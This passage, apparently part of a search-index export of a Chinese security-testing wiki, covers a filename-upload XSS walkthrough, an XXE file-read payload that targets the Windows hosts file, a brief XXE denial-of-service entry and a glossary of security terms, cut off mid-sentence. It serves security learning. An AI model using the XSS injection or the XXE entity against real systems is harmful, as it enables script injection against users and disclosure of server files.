\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u6587\u4ef6\u540d\u8c8c\u4f3c\u884c\u4e0d\u901a\u554a\uff0c\u6211\u4eec\u518d\u6765\u770b\u539f\u59cb\u7684\u4ee3\u7801\uff0c\u518d\u770b\u770b\u7b2c\u4e00\u5904 aaa.gif \u4e24\u79cd\u601d\u8def\uff1aA\uff09\u95ed\u5408a\uff0c\u5728\u540e\u9762\u5f62\u6210\u4ee3\u7801\uff1bB\uff09\u5728\u6807\u7b7e\u5185\u5f62\u6210\u5c5e\u6027\u4e8b\u4ef6 \u5148\u770bB\u601d\u8def\uff0conclick=\"downloadFile('hospital/0100101/2016/06/03/DR/369/20160603140244.gif','aaa.gif')\"\uff0c\u7740\u529b\u70b9\u5728\u8fd9\u91cc\uff0c\u8981\u95ed\u5408\u2019)\u201d\uff0c\u518d\u7ed9\u4e00\u4e2a\u4e8b\u4ef6\u5c5e\u6027\u5982onmouseover=\u201d\u201d \u8bd5\u8bd5\u6587\u4ef6\u540d\u2019)\u201donmouseover=\u201dalert(1)\u201d\uff0c\u5c1d\u8bd5\u540e\u53d1\u73b0\u201d\u548c\u2019\uff0c\u90fd\u662f\u95ee\u9898\u554a\u4f1a\u88ab\u5904\u7406\uff0c\u8fd9\u4e2a\u6ca1\u529e\u6cd5\u89c4\u907f\u554a \u518d\u770b\u770bA\u601d\u8def\u540c\u6837\u907f\u4e0d\u5f00\u2019\u201d\u554a \u5728\u56de\u5934\u770b\u770b\uff0c\u8c01\u8bf4\u6267\u884c\u811a\u672c\u4e0d\u9700\u8981 \u6807\u7b7e\u554a aaa.gif \u6587\u4ef6\u540d\u4e0d\u5305\u542b\u2019\u201d/ \\\uff0c\u53ef\u4ee5\u8003\u8651\u7684\u8fd8\u662f\u6807\u7b7e\u7684\u5c5e\u6027\uff0c\u4e8e\u662f\u770b\u4e8c\u4f4d\u7f6e\u6362\u6210 a.gif\u5982\u4f55 \u518d\u770b\u754c\u9762 OK\uff0cXSS\u6210\u529f\uff0c\u6240\u6709\u67e5\u770b\u8fd9\u4efd\u62a5\u544a\u7684\uff0c\u70b9\u51fb\u4e86\u8fd9\u4e2a\u9644\u4ef6\u7684\u90fd\u4f1a\u6267\u884c\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u6362\u6210\u5176\u4ed6\u5c5e\u6027\u89e6\u53d1\u4e8b\u4ef6\u5566\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u8bd5\u8bd5\u3002 \u8bf7\u4e0d\u8981\u5ffd\u7565\u8fd9\u4e2a\u65ad\u5b57\u7b26\u7684\u4ec5\u80fdalert(1)\u7684\u95ee\u9898\uff0c\u8fd9\u4e2a\u95ee\u9898\u4e5f\u53ef\u80fd\u548c\u5176\u4ed6\u6f0f\u6d1e\u7ed3\u5408\u53d1\u6325\u5927\u7684\u5a01\u529b\u54e6\uff08\u6bd4\u5982\u503c\u540c\u57df\u7136\u540e\u9493\u9c7c\uff09","title":"9.1. *\u6587\u4ef6\u540d\u4e0a\u4f20XSS*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#92-xxe","text":"\u4ec0\u4e48\u662fXXE ? \u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u6240\u8c13xml\u5b9e\u4f53\u6ce8\u5165\u3002entity\u7ffb\u8bd1\u4e3a\"\u5b9e\u4f53\"\u3002\u5b83\u7684\u4f5c\u7528\u7c7b\u4f3cword\u4e2d\u7684\"\u5b8f\"\uff0c\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3aDW\u4e2d\u7684\u6a21\u677f\uff0c\u4f60\u53ef\u4ee5\u9884\u5148\u5b9a\u4e49\u4e00\u4e2aentity\uff0c\u7136\u540e\u5728\u4e00\u4e2a\u6587\u6863\u4e2d\u591a\u6b21\u8c03\u7528\uff0c\u6216\u8005\u5728\u591a\u4e2a\u6587\u6863\u4e2d\u8c03\u7528\u540c\u4e00\u4e2aentity(XML\u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684entity\u3002\u4e00\u79cd\u662f\u6211\u4eec\u8fd9\u91cc\u8bf4\u7684\u666e\u901aentity\uff0c\u5728XML\u6587\u6863\u4e2d\u4f7f\u7528\uff1b\u53e6\u4e00\u79cd\u662f\u53c2\u6570entity\uff0c\u5728DTD\u6587\u4ef6\u4e2d\u4f7f\u7528\u3002)\u3002 \u53c2\u8003\uff1a http://blog.csdn.net/dongfengkuayue/article/details/50240157 http://drops.wooyun.org/papers/1911","title":"9.2. *XXE\u6f0f\u6d1e\u8be6\u89e3*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#921-xxe","text":"\u6784\u9020\u5982\u4e0bxml\u6587\u4ef6 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE file [ \u200b <!ENTITY file SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\"> ]> &file; \u200b &file; *1\u3001\u4f7f\u7528\u6700\u539f\u59cb\u7684javax.xml.parsers\uff0c\u6807\u51c6\u7684jdk api* \u5728\u89e3\u6790\u7ed3\u679c\u603b\u89e3\u6790\u51fa\u4e86hosts\u6587\u4ef6\u7684\u5185\u5bb9\u3002 2\u3001*** *\u4f7f\u7528dom4j\u540e\u7a0b\u5e8f\u53d8\u5f97\u66f4\u7b80\u5355**** 3\u3001*** *\u4f7f\u7528JDOM****","title":"9.2.1. *XXE\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#922-xxe","text":"1\u3001sax\u89e3\u6790\u7c7b\u5df2\u7ecf\u505a\u4e86\u5904\u7406 2\u3001\u5faa\u73af\u8c03\u7528","title":"9.2.2. *XXE\u62d2\u7edd\u670d\u52a1\u653b\u51fb*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#10","text":"*WAF* Web\u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1a WAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWeb\u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9HTTP/HTTPS\u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3aWeb\u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002 *\u5355\u70b9\u767b\u9646* \u5355\u70b9\u767b\u5f55\uff08Single Sign On\uff09\uff0c\u7b80\u79f0SSO\uff0c\u662f\u76ee\u524d\u6bd4\u8f83\u6d41\u884c\u7684\u4f01\u4e1a\u4e1a\u52a1\u6574\u5408\u89e3\u51b3\u65b9\u6848\u4e4b\u4e00\u3002SSO\u7684\u5b9a\u4e49\u662f\u5728\u591a\u4e2a\u5e94\u7528\u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u53ea\u9700\u8981\u767b\u5f55\u4e00\u6b21\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6240\u6709\u6709\u76f8\u4e92\u4fe1\u4efb\u7684\u5e94\u7528\u7cfb\u7edf\u3002 *PR7* PR \u503c\u5168\u79f0\u4e3a Page Rank(\u7f51\u9875\u7ea7\u522b)\uff0c\u53d6\u81eaGoogle\u7684\u521b\u59cb\u4ebaLarry Page \u3002\u5b83\u662fGoogle\u6392\u540d\u8fd0\u7b97\u6cd5\u5219\uff08\u6392\u540d\u516c\u5f0f\uff09\u7684\u4e00\u90e8\u5206\uff0c\u662fGoogle\u7528\u4e8e\u7528\u6765\u6807\u8bc6\u7f51\u9875\u7684\u7b49\u7ea7/\u91cd\u8981\u6027\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u662fGoogle\u7528\u6765\u8861\u91cf\u4e00\u4e2a\u7f51\u7ad9\u7684\u597d\u574f\u7684\u552f\u4e00\u6807\u51c6\u3002\u5728\u63c9\u5408\u4e86\u8bf8\u5982Title\u6807\u8bc6\u548cKeywords\u6807\u8bc6\u7b49\u6240\u6709\u5176\u5b83\u56e0\u7d20\u4e4b\u540e\uff0cGoogle\u901a\u8fc7 Page Rank\u6765\u8c03\u6574\u7ed3\u679c\uff0c\u4f7f\u90a3\u4e9b\u66f4\u5177\u201c\u7b49\u7ea7/\u91cd\u8981\u6027\u201d\u7684\u7f51\u9875\u5728\u641c\u7d22\u7ed3\u679c\u4e2d\u4ee4 \u7f51\u7ad9\u6392\u540d \u83b7\u5f97\u63d0\u5347\uff0c\u4ece\u800c\u63d0\u9ad8\u641c\u7d22\u7ed3\u679c\u7684\u76f8\u5173\u6027\u548c\u8d28\u91cf\u3002\u7ea7\u522b\u4ece1\u523010\u7ea7\uff0c10\u7ea7\u4e3a\u6ee1\u5206\u3002 PR \u503c\u8d8a\u9ad8\u8bf4\u660e\u8be5\u7f51\u9875\u8d8a\u53d7\u6b22\u8fce\uff08\u8d8a\u91cd\u8981\uff09 *OAuth\u6388\u6743* OAuth(\u5f00\u653e\u6388\u6743)\u662f\u4e00\u4e2a\u5f00\u653e\u6807\u51c6\u3002 \u5141\u8bb8\u7b2c\u4e09\u65b9\u7f51\u7ad9\u5728\u7528\u6237\u6388\u6743\u7684\u524d\u63d0\u4e0b\u8bbf\u95ee\u5728\u7528\u6237\u5728\u670d\u52a1\u5546\u90a3\u91cc\u5b58\u50a8\u7684\u5404\u79cd\u4fe1\u606f\u3002 \u800c\u8fd9\u79cd\u6388\u6743\u65e0\u9700\u5c06\u7528\u6237\u63d0\u4f9b\u7528\u6237\u540d\u548c\u5bc6\u7801\u63d0\u4f9b\u7ed9\u8be5\u7b2c\u4e09\u65b9\u7f51\u7ad9\u3002 OAuth\u5141\u8bb8\u7528\u6237\u63d0\u4f9b\u4e00\u4e2a\u4ee4\u724c\u7ed9\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u4e00\u4e2a\u4ee4\u724c\u5bf9\u5e94\u4e00\u4e2a\u7279\u5b9a\u7684\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u540c\u65f6\u8be5\u4ee4\u724c\u53ea\u80fd\u5728\u7279\u5b9a\u7684\u65f6\u95f4\u5185\u8bbf\u95ee\u7279\u5b9a\u7684\u8d44\u6e90. \u8be6\u7ec6\u53c2\u8003\uff1a http://justcoding.iteye.com/blog/1950270 *REST WebService* REST\uff08Representational State Transfer\uff09\u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7684Web Service\u67b6\u6784\u98ce\u683c\uff0c\u5176\u5b9e\u73b0\u548c\u64cd\u4f5c\u660e\u663e\u6bd4SOAP\u548cXML-RPC\u66f4\u4e3a\u7b80\u6d01\uff0c\u53ef\u4ee5\u5b8c\u5168\u901a\u8fc7HTTP\u534f\u8bae\u5b9e\u73b0\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528\u7f13\u5b58Cache\u6765\u63d0\u9ad8\u54cd\u5e94\u901f\u5ea6\uff0c\u6027\u80fd\u3001\u6548\u7387\u548c\u6613\u7528\u6027\u4e0a\u90fd\u4f18\u4e8eSOAP\u534f\u8bae\u3002 *\u9690\u5199\u672f* \u9690\u5199\u672f\u662f\u5173\u4e8e\u4fe1\u606f\u9690\u85cf\uff0c\u5373\u4e0d\u8ba9\u8ba1\u5212\u7684\u63a5\u6536\u8005\u4e4b\u5916\u7684\u4efb\u4f55\u4eba\u77e5\u9053\u4fe1\u606f\u7684\u4f20\u9012\u4e8b\u4ef6\uff08\u800c\u4e0d\u53ea\u662f\u4fe1\u606f\u7684\u5185\u5bb9\uff09\u7684\u4e00\u95e8\u6280\u5de7\u4e0e\u79d1\u5b66\u3002\u9690\u5199\u672f\u82f1\u6587\u4f5c\u201cSteganography\u201d\uff0c\u6765\u6e90\u4e8e\u7ea6\u7ff0\u5c3c\u65af\u00b7\u7279\u91cc\u7279\u7c73\u4e4c\u65af\u7684\u4e00\u672c\u770b\u4e0a\u53bb\u662f\u6709\u5173\u9ed1\u9b54\u6cd5\uff0c\u5b9e\u9645\u4e0a\u662f\u8bb2\u5bc6\u7801\u5b66\u4e0e\u9690\u5199\u672f\u7684\u4e00\u672c\u4e66Steganographia\u4e2d\u3002\u6b64\u4e66\u4e66\u540d\u6765\u6e90\u4e8e\u5e0c\u814a\u8bed\uff0c\u610f\u4e3a\u201c\u9690\u79d8\u4e66\u5199\u201d\u3002 *CTF* CTF\uff08Capture the Flag\uff09\u593a\u65d7\u6bd4\u8d5b\u3002 *MIME\u7f16\u7801* MIME\uff08Multipurpose Internet Mail Extensions\uff09\u591a\u90e8\u5206(multi-part)\u3001\u591a\u5a92\u4f53\u7535\u5b50\u90ae\u4ef6\u548cWWW\u8d85\u6587\u672c\u7684\u4e00\u79cd\u7f16\u7801\u6807\u51c6\uff0c\u7528\u4e8e\u4f20\u9001\u8bf8\u5982\u56fe\u5f62\u3001\u58f0\u97f3\u548c\u4f20\u771f\u7b49\u975e\u6587\u672c\u6570\u636e\u3002 *PKCS* The Public-Key Cryptography Standards (PKCS)\u662f\u7531\u7f8e\u56fdRSA\u6570\u636e\u5b89\u5168\u516c\u53f8\u53ca\u5176\u5408\u4f5c\u4f19\u4f34\u5236\u5b9a\u7684\u4e00\u7ec4\u516c\u94a5\u5bc6\u7801\u5b66\u6807\u51c6\uff0c\u5176\u4e2d\u5305\u62ec\u8bc1\u4e66\u7533\u8bf7\u3001\u8bc1\u4e66\u66f4\u65b0\u3001\u8bc1\u4e66\u4f5c\u5e9f\u8868\u53d1\u5e03\u3001\u6269\u5c55\u8bc1\u4e66\u5185\u5bb9\u4ee5\u53ca\u6570\u5b57\u7b7e\u540d\u3001\u6570\u5b57\u4fe1\u5c01\u7684\u683c\u5f0f\u7b49\u65b9\u9762\u7684\u4e00\u7cfb\u5217\u76f8\u5173\u534f\u8bae\u3002 PKCS#1\uff1a\u5b9a\u4e49RSA\u516c\u5f00\u5bc6\u94a5\u7b97\u6cd5\u52a0\u5bc6\u548c\u7b7e\u540d\u673a\u5236\uff0c\u4e3b\u8981\u7528\u4e8e\u7ec4\u7ec7PKCS#7\u4e2d\u6240\u63cf\u8ff0\u7684\u6570\u5b57\u7b7e\u540d\u548c\u6570\u5b57\u4fe1\u5c01\u3002 *WASC* Web Application Security Consortium\uff08WASC\uff09\uff0c\u662f\u4e00\u4e2a\u7531\u5b89\u5168\u4e13\u5bb6\u3001\u884c\u4e1a\u987e\u95ee\u548c\u8bf8\u591a\u7ec4\u7ec7\u7684\u4ee3\u8868\u7ec4\u6210\u7684\u56fd\u9645\u56e2\u4f53\u3002WASC \u7ec4\u7ec7\u7684\u5173\u952e\u9879\u76ee\u4e4b\u4e00\u662f\u201cWeb \u5b89\u5168\u5a01\u80c1\u5206\u7c7b\u201d\uff0c\u4e5f\u5c31\u662f\u5c06 Web \u5e94\u7528\u6240\u53d7\u5230\u7684\u5a01\u80c1\u3001\u653b\u51fb\u8fdb\u884c\u8bf4\u660e\u5e76\u5f52\u7eb3\u6210\u5177\u6709\u5171\u540c\u7279\u5f81\u7684\u5206\u7c7b\u3002\u8be5\u9879\u76ee\u7684\u76ee\u7684\u662f\u9488\u5bf9 Web \u5e94\u7528\u7684\u5b89\u5168\u9690\u60a3\uff0c\u5236\u5b9a\u548c\u63a8\u5e7f\u884c\u4e1a\u6807\u51c6\u672f\u8bed\u3002 *OWASP* Open Web Application Security Project\uff08OWASP\uff09\uff0c\u8be5\u7ec4\u7ec7\u81f4\u529b\u4e8e\u53d1\u73b0\u548c\u89e3\u51b3\u4e0d\u5b89\u5168 Web \u5e94\u7528\u7684\u6839\u672c\u539f\u56e0\u3002\u5b83\u4eec\u6700\u91cd\u8981\u7684\u9879\u76ee\u4e4b\u4e00\u662f\u201cWeb \u5e94\u7528\u7684\u5341\u5927\u5b89\u5168\u9690\u60a3\u201d\uff0c\u603b\u7ed3\u4e86\u76ee\u524d Web \u5e94\u7528\u6700\u5e38\u53d7\u5230\u7684\u5341\u79cd\u653b\u51fb\u624b\u6bb5\uff0c\u5e76\u4e14\u6309\u7167\u653b\u51fb\u53d1\u751f\u7684\u6982\u7387\u8fdb\u884c\u4e86\u6392\u5e8f\u3002\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u7684\u662f\u7edf\u4e00\u4e1a\u754c\u6700\u5173\u952e\u7684 Web \u5e94\u7528\u5b89\u5168\u9690\u60a3\uff0c\u5e76\u4e14\u52a0\u5f3a\u4f01\u4e1a\u5bf9 Web \u5e94\u7528\u5b89\u5168\u7684\u610f\u8bc6\u3002 *CORS* CORS(Cross Origin Resourse-Sharing)\uff0c\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u3002 *Node.js* Node.js\u662f\u4e00\u4e2aJavascript\u8fd0\u884c\u73af\u5883(runtime)\u3002 \u5b9e\u9645\u4e0a\u5b83\u662f\u5bf9Google V8\u5f15\u64ce\u8fdb\u884c\u4e86\u5c01\u88c5\u3002V8\u5f15 \u64ce\u6267\u884cJavascript\u7684\u901f\u5ea6\u975e\u5e38\u5feb\uff0c\u6027\u80fd\u975e\u5e38\u597d\u3002Node.js\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7528\u4f8b\u8fdb\u884c\u4e86\u4f18\u5316\uff0c\u63d0\u4f9b\u4e86\u66ff\u4ee3\u7684API\uff0c\u4f7f\u5f97V8\u5728\u975e\u6d4f\u89c8\u5668\u73af\u5883\u4e0b\u8fd0\u884c\u5f97\u66f4 \u597d\u3002 [1] Node.js\u662f\u4e00\u4e2a\u57fa\u4e8eChrome JavaScript\u8fd0\u884c\u65f6\u5efa\u7acb\u7684\u5e73\u53f0\uff0c \u7528\u4e8e\u65b9\u4fbf\u5730\u642d\u5efa\u54cd\u5e94\u901f\u5ea6\u5feb\u3001\u6613\u4e8e\u6269\u5c55\u7684\u7f51\u7edc\u5e94\u7528\u3002Node.js \u4f7f\u7528 \u4e8b\u4ef6\u9a71\u52a8 \uff0c \u975e\u963b\u585e I/O \u6a21\u578b\u800c\u5f97\u4ee5\u8f7b\u91cf\u548c\u9ad8\u6548\uff0c\u975e\u5e38\u9002\u5408\u5728\u5206\u5e03\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c\u7684\u6570\u636e\u5bc6\u96c6\u578b\u7684\u5b9e\u65f6\u5e94\u7528\u3002 *SSRF* SSRF(Server-Side Request Forgery:\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020) \u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF\u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002\uff08\u6b63\u662f\u56e0\u4e3a\u5b83\u662f\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u7684\uff0c\u6240\u4ee5\u5b83\u80fd\u591f\u8bf7\u6c42\u5230\u4e0e\u5b83\u76f8\u8fde\u800c\u4e0e\u5916\u7f51\u9694\u79bb\u7684\u5185\u90e8\u7cfb\u7edf\uff09 \u6e17\u900f\u653b\u51fb\u3001\u653b\u51fb\u8f7d\u8377payload\u3001shellcode *CWE* CWE(Common Weakness Enumeration),\u901a\u7528\u5f31\u70b9\u679a\u4e3e\u3002\u8f6f\u4ef6\u5f31\u70b9\u5206\u7c7b\uff0c\u66f4\u597d\u5730\u8bc6\u522b\u7f3a\u9677\u3001\u4fee\u590d\u963b\u6b62\u7f3a\u9677\u5b9e\u73b0\u81ea\u52a8\u5316\u3002 *CDN* CDN(ConTent Deliver network)\u5185\u5bb9\u5206\u53d1\u7f51\u7edc\u3002\u4ee5\u8d1f\u8f7d\u5747\u8861\u4e3a\u6838\u5fc3\u3002 *Maven* Maven\u9879\u76ee\u5bf9\u8c61\u6a21\u578b\uff08POM\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e00\u5c0f\u6bb5\u63cf\u8ff0\u4fe1\u606f\u6765\u7ba1\u7406\u9879\u76ee\u7684\u6784\u5efa\uff0c\u62a5\u544a\u548c\u6587\u6863\u7684\u8f6f\u4ef6\u9879\u76ee\u7ba1\u7406\u5de5\u5177\u3002 *WebRTC* WebRTC\uff08Web Real-Time Commutication\uff09Web\u5b9e\u65f6\u901a\u8baf\u7684\u7f29\u5199\uff0c\u5c31\u662f\u4f7f\u7528Web\u6d4f\u89c8\u5668\u5b8c\u6210\u5b9e\u65f6\u7684\u8bed\u97f3\u5bf9\u8bdd\u548c\u89c6\u5c4f\u5bf9\u8bdd\u7684\u6280\u672f\u3002 *APT* APT\uff08Advance Persistent Thread\uff09\u9ad8\u7ea7\u53ef\u6301\u7eed\u6027\u653b\u51fb\u3002APT\u662f\u9ed1\u5ba2\u4ee5\u7a83\u53d6\u6838\u5fc3\u8d44\u6599\u4e3a\u76ee\u7684\uff0c\u9488\u5bf9\u5ba2\u6237\u6240\u53d1\u52a8\u7684\u7f51\u7edc\u653b\u51fb\u548c\u4fb5\u88ad\u884c\u4e3a\uff0c\u662f\u4e00\u79cd\u84c4\u8c0b\u5df2\u4e45\u7684\u201c\u6076\u610f\u5546\u4e1a\u95f4\u8c0d\u5a01\u80c1\u201d\u3002\u8fd9\u79cd\u884c\u4e3a\u5f80\u5f80\u7ecf\u8fc7\u957f\u671f\u7684\u7ecf\u8425\u4e0e\u7b56\u5212\uff0c\u5e76 \u5177\u5907\u9ad8\u5ea6\u7684\u9690\u853d\u6027\u3002APT\u7684\u653b\u51fb\u624b\u6cd5\uff0c\u5728\u4e8e\u9690\u533f\u81ea\u5df1\uff0c\u9488\u5bf9\u7279\u5b9a\u5bf9\u8c61\uff0c\u957f\u671f\u3001\u6709\u8ba1\u5212\u6027\u548c\u7ec4\u7ec7\u6027\u5730\u7a83\u53d6\u6570\u636e\uff0c\u8fd9\u79cd\u53d1\u751f\u5728\u6570\u5b57\u7a7a\u95f4\u7684\u5077\u7a83\u8d44\u6599\u3001\u641c\u96c6\u60c5\u62a5\u7684\u884c\u4e3a\uff0c \u5c31\u662f\u4e00\u79cd\u201c\u7f51\u7edc\u95f4\u8c0d\u201d\u7684\u884c\u4e3a\u3002 *CVSS* Common Vulnerability Scoring System\uff0c\u5373\u201c\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\u201d\uff0c\u662f\u4e00\u4e2a\u201c\u884c\u4e1a\u516c\u5f00\u6807\u51c6\uff0c\u5176\u88ab\u8bbe\u8ba1\u7528\u6765\u8bc4\u6d4b\u6f0f\u6d1e\u7684\u4e25\u91cd\u7a0b\u5ea6\uff0c\u5e76\u5e2e\u52a9\u786e\u5b9a\u6240\u9700\u53cd\u5e94\u7684\u7d27\u6025\u5ea6\u548c\u91cd\u8981\u5ea6\u201d\u3002 CVSS\u662f\u5b89\u5168\u5185\u5bb9\u81ea\u52a8\u5316\u534f\u8bae\uff08SCAP\uff09[2]\u7684\u4e00\u90e8\u5206\uff0c\u901a\u5e38CVSS\u540cCVE\u4e00\u540c\u7531\u7f8e\u56fd\u56fd\u5bb6\u6f0f\u6d1e\u5e93\uff08NVD\uff09\u53d1\u5e03\uff0c\u7531\u7f8e\u56fd\u56fd\u5bb6\u57fa\u7840\u5efa\u8bbe\u54a8\u8be2\u59d4\u5458\u4f1a\uff08NIAC\uff09\u59d4\u6258\u5236\u4f5c\uff0c\u662f\u4e00\u5957\u516c\u5f00\u7684\u8bc4\u6d4b\u6807\u51c6\uff0c\u7ecf\u5e38\u88ab\u7528\u6765\u8bc4\u6bd4\u4f01\u4e1a\u8d44\u8baf\u79d1\u6280\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u5e76\u53d7\u5230eBay\u3001(Symantec)\u3001\u601d\u79d1(Cisco)\u3001\u7532\u53e4\u6587( Oracle )\u7b49\u4f17\u591a\u5382\u5546\u652f\u63f4\u3002 CVSS\u7684\u76ee\u6807\u662f\u4e3a\u6240\u6709\u8f6f\u4ef6\u5b89\u5168\u6f0f\u6d1e\u63d0\u4f9b\u4e00\u4e2a\u4e25\u91cd\u7a0b\u5ea6\u7684\u8bc4\u7ea7 \u8fd9\u5c31\u610f\u5473\u7740CVSS\u65e8\u5728\u4e3a\u4e00\u4e2a\u5df2\u77e5\u7684\u5b89\u5168\u6f0f\u6d1e\u7684\u4e25\u91cd\u7a0b\u5ea6\u63d0\u4f9b\u4e00\u4e2a\u6570\u503c(\u5206\u6570)\uff0c\u800c\u4e0d\u7ba1\u8fd9\u4e2a\u5b89\u5168\u6f0f\u6d1e\u5f71\u54cd\u7684\u8f6f\u4ef6\u7c7b\u578b\u662f\u4ec0\u4e48\uff0c\u4e0d\u7ba1\u5b83\u662f \u64cd\u4f5c\u7cfb\u7edf \u3001\u6740\u6bd2\u8f6f\u4ef6\u3001 \u6570\u636e\u5e93 \u3001\u90ae\u4ef6\u670d\u52a1\u5668\u3001\u684c\u9762\u8fd8\u662f\u5546\u52a1\u5e94\u7528\u7a0b\u5e8f\u3002\u7531\u4e8e\u8fd9\u4e2a\u8bc4\u5206\u8303\u56f4\u975e\u5e38\u5e7f\uff0c\u8fd9\u4e2a\u8bc4\u5206\u7cfb\u7edf\u628a\u80fd\u591f\u5b8c\u5168\u653b\u7834\u64cd\u4f5c\u7cfb\u7edf\u5c42\u7684\u5df2\u77e5\u5b89\u5168\u6f0f\u6d1e\u8bc4\u4e3a\u57fa\u51c6\u5206\u657010.0\u5206\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cCVSS\u57fa\u51c6\u5206\u6570\u4e3a10.0\u5206\u7684\u5b89\u5168\u6f0f\u6d1e\u4e00\u822c\u6307\u80fd\u591f\u5b8c\u5168\u653b\u7834\u7cfb\u7edf\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5178\u578b\u7684\u7ed3\u679c\u662f\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u4e00\u4e2a\u7cfb\u7edf\uff0c\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u5c42\u7684\u7ba1\u7406\u6216\u8005\u201c\u6839\u201d\u6743\u9650\u3002\u4f8b\u5982\uff0c\u56fd\u5bb6\u5b89\u5168\u6f0f\u6d1e\u6570\u636e\u5e93\u4e2d\u4e00\u4e2a\u7b2c\u4e09\u65b9\u4ea7\u54c1\u4e2d\u7684\u8fd9\u79cd\u5b89\u5168\u6f0f\u6d1e\u88ab\u89e3\u91ca\u4e3a\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5b89\u88c5\u7a0b\u5e8f;\u89c2\u770b\u3001\u4fee\u6539\u6216\u8005\u5220\u9664\u6570\u636e;\u6216\u8005\u521b\u5efa\u62e5\u6709\u7528\u6237\u5168\u90e8\u6743\u5229\u7684\u65b0\u8d26\u6237\u3002 \u5b83\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5e2e\u52a9\u4eba\u4eec\u5efa\u7acb\u8861\u91cf\u6f0f\u6d1e\u4e25\u91cd\u7a0b\u5ea6\u7684\u6807\u51c6\uff0c\u4f7f\u5f97\u4eba\u4eec\u53ef\u4ee5\u6bd4\u8f83\u6f0f\u6d1e\u7684\u4e25\u91cd\u7a0b\u5ea6\uff0c\u4ece\u800c\u786e\u5b9a\u5904\u7406\u5b83\u4eec\u7684\u4f18\u5148\u7ea7\u3002CVSS\u5f97\u5206\u57fa\u4e8e\u4e00\u7cfb\u5217\u7ef4\u5ea6\u4e0a\u7684\u6d4b\u91cf\u7ed3\u679c\uff0c\u8fd9\u4e9b\u6d4b\u91cf\u7ef4\u5ea6\u88ab\u79f0\u4e3a\u91cf\u5ea6\uff08Metrics\uff09\u3002\u6f0f\u6d1e\u7684\u6700\u7ec8\u5f97\u5206\u6700\u5927\u4e3a10\uff0c\u6700\u5c0f\u4e3a0\u3002\u5f97\u52067 10\u7684\u6f0f\u6d1e\u901a\u5e38\u88ab\u8ba4\u4e3a\u6bd4\u8f83\u4e25\u91cd\uff0c\u5f97\u5206\u57284 6.9\u4e4b\u95f4\u7684\u662f\u4e2d\u7ea7\u6f0f\u6d1e\uff0c0~3.9\u7684\u5219\u662f\u4f4e\u7ea7\u6f0f\u6d1e CVSS\u7cfb\u7edf\u5305\u62ec\u4e09\u79cd\u7c7b\u578b\u7684\u5206\u6570 - 